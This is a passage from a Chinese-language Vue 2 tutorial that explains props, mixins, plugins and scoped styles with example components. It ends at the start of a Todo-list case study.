<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">props:&#123;<br>	name:<span class="hljs-built_in">Number</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>第三种方式（限制类型、限制必要性、指定默认值）：</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dart">props:&#123;<br>	name:&#123;<br>		type: <span class="hljs-built_in">String</span>, <span class="hljs-comment">// 类型</span><br>		<span class="hljs-keyword">required</span>: <span class="hljs-keyword">true</span>, <span class="hljs-comment">//必要性</span><br>		<span class="hljs-keyword">default</span>: <span class="hljs-string">&#x27;张加林&#x27;</span>, <span class="hljs-comment">//默认值，与required配置项不兼容</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>注意：<code>props</code>是只读的，<code>Vue</code>底层会监测你对<code>props</code>的修改，如果进行修改，就会发出警告，若业务需求确实需要修改，那么请复制<code>props</code>的内容到<code>data</code>中一份，然后去修改<code>data</code>中的数据。</p>
</li>
</ul>
<h3 id="3-7-mixin混入"><a href="#3-7-mixin混入" class="headerlink" title="3.7 mixin混入"></a>3.7 mixin混入</h3><p>两个组件有相同的需求：点击button，提示名称</p>
<p><code>Student.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;showName&quot;&gt;点击按钮提示名称&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入混合<br>import &#123; mixin &#125; from &quot;..&#x2F;mixin&quot;;<br><br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      age: 20,<br>      name: &quot;张加林&quot;,<br>    &#125;;<br>  &#125;,<br>  mixins:[mixin]<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br><br>&lt;style&gt;<br>.age &#123;<br>  color: #8080ff;<br>&#125;<br><br>.name &#123;<br>  color: #2030ff;<br>  background-color: #999;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>School.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;school&quot;&gt;<br>    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;showName&quot;&gt;点击按钮提示名称&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入混合<br>import &#123; mixin &#125; from &quot;..&#x2F;mixin&quot;;<br><br>export default &#123;<br>  name: &quot;Student&quot;,<br>  data() &#123;<br>    return &#123;<br>      name: &quot;UESTC&quot;,<br>      address: &quot;成华区建设路&quot;,<br>    &#125;;<br>  &#125;,<br>  mixins: [mixin],<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.school &#123;<br>  color: #99ff00;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>mixin.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mixin = &#123;<br>  methods: &#123;<br>    <span class="hljs-function"><span class="hljs-title">showName</span>(<span class="hljs-params"></span>)</span> &#123;<br>      alert(<span class="hljs-built_in">this</span>.name);<br>    &#125;,<br>  &#125;,<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>混合就是复用配置。</p>
<hr>
<p><code> mixin.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mixin2 = &#123;<br>  <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      x: <span class="hljs-number">400</span>,<br>      y: <span class="hljs-number">100</span>,<br>    &#125;;<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922233230075.png" srcset="/img/loading.gif" lazyload alt="image-20210922233230075" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922233237581.png" srcset="/img/loading.gif" lazyload alt="image-20210922233237581" style="zoom:80%;" />

<p>混入中的<code>data</code>与组件中的<code>data</code>会进行整合，二者之间如果出现相同的配置名称，即出现冲突，以组件的原始<code>data</code>配置为准。（原则：<code>mixin</code>中有的数据，组件<code>data</code>中没有的，就将<code>mixin.js</code>中的加入；如果组件<code>data</code>中有的，就以组件中的为准）</p>
<hr>
<p>易错点：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234200366.png" srcset="/img/loading.gif" lazyload alt="image-20210922234200366" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234153070.png" srcset="/img/loading.gif" lazyload alt="image-20210922234153070" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234139920.png" srcset="/img/loading.gif" lazyload alt="image-20210922234139920" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234106377.png" srcset="/img/loading.gif" lazyload alt="image-20210922234106377"></p>
<p>对于生命周期钩子，不以二者中的任何一个为主，都会被执行。，而且是<code>mixin.js</code>中的钩子先于组件中的钩子执行。</p>
<hr>
<p>上述所有的混入都是局部混入，下面介绍全局混合：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234839892.png" srcset="/img/loading.gif" lazyload></p>
<p>整个应用中，所有的<code>vc</code> / <code>vm</code>都会得到混入配置，下面验证：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922235116129.png" srcset="/img/loading.gif" lazyload alt="image-20210922235116129"><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922235139712.png" srcset="/img/loading.gif" lazyload alt="image-20210922235139712"></p>
<h4 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h4><p>mixin混入</p>
<ul>
<li><p>功能：可以把多个组件共用的配置提取成一个混入对象</p>
</li>
<li><p>使用方式：</p>
<ul>
<li><p>第一步定义混入，例如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mixin&#123;<br>	<span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span>&#123;……&#125;,<br>	methods:&#123;……&#125;<br>	……<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>第二步使用混入，例如：</p>
<ul>
<li><p>全局混入：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Vue.<span class="hljs-keyword">mixin</span>(xxxx)<br></code></pre></td></tr></table></figure>
</li>
<li><p>局部混入</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">mixins:[<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-string">&#x27;xxx&#x27;</span>,……]<br></code></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-8-插件"><a href="#3-8-插件" class="headerlink" title="3.8 插件"></a>3.8 插件</h3><p><code>plugins.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-function"><span class="hljs-title">install</span>(<span class="hljs-params">a</span>)</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;@@@install&quot;</span>, a);<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923090448061.png" srcset="/img/loading.gif" lazyload alt="image-20210923090448061" style="zoom:80%;" />

<p><code>a</code>为<code>vm</code>的缔造者——<code>Vue</code>的构造函数</p>
<p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 引入Vue</span><br><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span>;<br><span class="hljs-comment">// 引入App</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./App.vue&quot;</span>;<br><span class="hljs-comment">// 引入插件</span><br><span class="hljs-keyword">import</span> plugins <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./plugins&quot;</span>;<br><span class="hljs-comment">// 关闭生产提示</span><br>Vue.config.productionTip = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// 应用插件</span><br>Vue.use(plugins);<br><span class="hljs-comment">// 创建vm</span><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  components: &#123; App &#125;,<br>  render: <span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> h(App),<br>&#125;).$mount(<span class="hljs-string">&quot;#app&quot;</span>);<br></code></pre></td></tr></table></figure>

<hr>
<p>下面进行插件的使用：</p>
<p><code>plugin.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-function"><span class="hljs-title">install</span>(<span class="hljs-params">Vue</span>)</span> &#123;<br>    <span class="hljs-comment">// 配置全局过滤器</span><br>    Vue.filter(<span class="hljs-string">&quot;myslice&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> value.slice(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    &#125;);<br><br>    <span class="hljs-comment">// 定义全局指令</span><br>    Vue.directive(<span class="hljs-string">&quot;fbind&quot;</span>, &#123;<br>      <span class="hljs-function"><span class="hljs-title">bind</span>(<span class="hljs-params">element, binding</span>)</span> &#123;<br>        element.value = binding.value;<br>      &#125;,<br>      <span class="hljs-function"><span class="hljs-title">inserted</span>(<span class="hljs-params">element</span>)</span> &#123;<br>        element.focus();<br>      &#125;,<br>      <span class="hljs-function"><span class="hljs-title">update</span>(<span class="hljs-params">element, binding</span>)</span> &#123;<br>        element.value = binding.value;<br>      &#125;,<br>    &#125;);<br><br>    <span class="hljs-comment">// 定义混入</span><br>    Vue.mixin(&#123;<br>      <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>          x: <span class="hljs-number">100</span>,<br>          y: <span class="hljs-number">99</span>,<br>&#125;;<br>      &#125;,<br>    &#125;);<br><br>    <span class="hljs-comment">// 给Vue原型上添加一个方法（vm和vc都能使用）</span><br>    Vue.prototype.hello = <span class="hljs-function">() =&gt;</span> &#123;<br>      alert(<span class="hljs-string">&quot;你好啊,zhul&quot;</span>);<br>    &#125;;<br>  &#125;,<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p><code>main.js</code>：略</p>
<p><code>School.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;school&quot;&gt;<br>    &lt;h2&gt;学校名称：&#123;&#123; name | myslice &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;test&quot;&gt;点我测试插件中的hello&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;Student&quot;,<br>  data() &#123;<br>    return &#123;<br>      name: &quot;UESTC&quot;,<br>      address: &quot;成华区建设路&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    test() &#123;<br>      console.log(this);<br>      this.hello();<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.school &#123;<br>  color: #99ff00;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>Student.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;input type&#x3D;&quot;text&quot; v-fbind:value&#x3D;&quot;name&quot; &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      age: 20,<br>      name: &quot;张加林&quot;,<br>    &#125;;<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br><br>&lt;style&gt;<br>.age &#123;<br>  color: #8080ff;<br>&#125;<br><br>.name &#123;<br>  color: #2030ff;<br>  background-color: #999;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>插件功能：用于增强Vue</p>
<p>本质：包含<code>install</code>方法的一个对象，<code>install</code>第一个参数是<code>Vue</code>，第二个以后的参数是插件使用者传递的参数数据。</p>
<p>定义插件：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">对象.install = <span class="hljs-keyword">function</span>(Vue, option)&#123;<br>	<span class="hljs-regexp">//</span> 添加全局过滤器<br>	<br>	<span class="hljs-regexp">//</span> 添加全局指令<br>	<br>	<span class="hljs-regexp">//</span> 配置全局混入<br>	<br>	<span class="hljs-regexp">//</span> 添加实例对象<br>	Vue.prototype.<span class="hljs-variable">$myMethod</span> = <span class="hljs-keyword">function</span>()&#123;……&#125;<br>	Vue.prototype.<span class="hljs-variable">$myProperty</span> = xxx<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用插件：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Vue</span>.</span></span>use(xxx)<br></code></pre></td></tr></table></figure>

<h3 id="3-9-scoped样式"><a href="#3-9-scoped样式" class="headerlink" title="3.9 scoped样式"></a>3.9 scoped样式</h3><p>用于避免组件类名冲突。</p>
<p>例子：</p>
<p><code>Student.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;demo&quot;&gt;<br>    &lt;h2&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      age: 20,<br>      name: &quot;张加林&quot;,<br>    &#125;;<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br><br>&lt;style&gt;<br>.demo &#123;<br>  color: #8080ff;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>School.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;demo&quot;&gt;<br>    &lt;h2&gt;学校名称：&#123;&#123; name | myslice &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;Student&quot;,<br>  data() &#123;<br>    return &#123;<br>      name: &quot;UESTC&quot;,<br>      address: &quot;成华区建设路&quot;,<br>    &#125;;<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>.demo &#123;<br>  color: #99ff00;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;Student &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br>    &lt;School &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br>import School from &quot;.&#x2F;components&#x2F;School&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student, School &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p>最终<code>School</code>中的<code>demo</code>样式生效，因为它最后被引入，覆盖了前面的样式，在<code>style</code>标签上添加<code>scoped</code>属性即可。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923095223720.png" srcset="/img/loading.gif" lazyload alt="image-20210923095223720" style="zoom:80%;" />

<p>作用原理：给最外侧的标签添加一个标签属性，后面的值是随机生成的，再配合标签属性选择器，就完后了控制指定的标签。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923095456296.png" srcset="/img/loading.gif" lazyload alt="image-20210923095456296" style="zoom:80%;" />

<p>同时，在<code>App.vue</code>上的<code>style</code>标签上添加<code>scoped</code>可以防止样式被传递到所有的组件中去。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>lang</code>代表CSS的书写语言，例如：<code>css</code> / <code>less</code></p>
<p>但是<code>lang = &quot;less&quot;</code>会报错<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100031294.png" srcset="/img/loading.gif" lazyload alt="image-20210923100031294" style="zoom: 80%;" /></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100125877.png" srcset="/img/loading.gif" lazyload alt="image-20210923100125877" style="zoom:80%;" />

<p>可能会报错，因为<code>webpack</code>已经到第五版本了，但是<code>Vue</code>官方的脚手架在使用<code>webpack</code>时，使用的不是第五版本：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100435381.png" srcset="/img/loading.gif" lazyload alt="image-20210923100435381" style="zoom:80%;" />

<p><code>less-loader</code>直接安装就是最新版本，最新版本完全是为了迎合<code>webpack5</code>，而在低版本的<code>webapck</code>中安装最新版本的<code>webpack</code>，显然不太合适。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm view webpack versions <span class="hljs-regexp">//</span>查看webpack所有版本<br><br>npm view less-loader versions <span class="hljs-regexp">//</span> 查看less-loader版本<br></code></pre></td></tr></table></figure>

<p>安装<code>less-loader</code>就可以正常使用<code>less</code>，不写<code>lang</code>属性默认为<code>css</code></p>
<h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p>scoped样式：让样式在局部生效，防止冲突。</p>
<p>写法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="3-10-Todo-list-案例"><a href="#3-10-Todo-list-案例" class="headerlink" title="3.10 Todo-list 案例"></a>3.10 Todo-list 案例</h3><h4 id="3-10-1-静态"><a href="#3-10-1-静态" class="headerlink" title="3.10.1 静态"></a>3.10.1 静态</h4><ul>
<li>拆组件的注意事项：<ul>
<li>先拆结构后拆样式，先把所有的结构放入App，再逐个细化，细化后要及时将原来的标签用组件标签代替；拆样式，注意加<code>scoped</code>，防止作用域混乱</li>
<li>不要使用<code>Header/Head/Foot/Footer</code>等<code>html</code>标签作为组件名称！</li>
<li>拆分没有绝对标准，功能实现即可</li>
</ul>
</li>
</ul>
<p>需要拆分的<code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs 